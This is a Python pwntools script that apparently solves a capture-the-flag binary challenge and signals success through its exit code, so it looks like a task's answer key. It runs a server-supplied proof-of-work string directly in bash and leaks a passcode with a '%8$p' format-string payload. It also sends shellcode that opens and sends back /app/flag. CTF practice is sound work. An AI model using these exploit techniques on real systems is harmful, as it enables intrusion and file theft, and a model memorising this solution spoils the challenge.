#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


context.binary = exe = ELF('/home/user/chal', checksec=False)

io = pwnlib.tubes.remote.remote('challenge', 1337)
tmp_data = io.recv(len('proof'), timeout=2)
if tmp_data == b'proof':
    handle_pow(io)
else:
    io.unrecv(tmp_data)

io.sendlineafter(b': ', str(0x700000100).encode())
io.sendlineafter(b': ', b'%8$p%10c')

shellcode = shellcraft.openat(0, "/app/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 'rax', 0, 50)
payload = asm(shellcode)
io.sendlineafter(b': ', payload)

io.recvuntil(b'0x')
passcode = int(io.recvuntil(b' '), 16)
io.sendlineafter(b': ', b'y')
io.sendlineafter(b': ', str(passcode).encode())

buf = io.recvuntil(b'}', timeout=2)
print(buf)

exit(0 if 'cr3{' in buf.decode() else 1)
